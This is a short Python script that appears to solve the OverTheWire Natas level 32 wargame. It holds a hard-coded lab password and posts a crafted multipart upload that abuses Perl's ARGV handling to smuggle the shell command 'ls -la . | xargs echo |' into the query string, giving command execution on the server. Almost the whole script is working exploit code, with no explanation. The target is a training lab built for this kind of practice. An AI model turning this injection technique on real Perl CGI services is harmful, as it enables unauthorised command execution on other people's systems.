import requests
from requests.auth import HTTPBasicAuth

basicAuth = HTTPBasicAuth('natas32', 'Rc3837d6qd3KoW0R2IgKssMXRX06btgY')
url = "http://natas32.natas.labs.overthewire.org/index.pl?ls -la . | xargs echo |"

files = [
    ('file', (None, 'ARGV')),
    ('file', ('dummy.csv', '1,2,3\n')),
]

r = requests.post(url, auth=basicAuth, files=files)
print(r.text)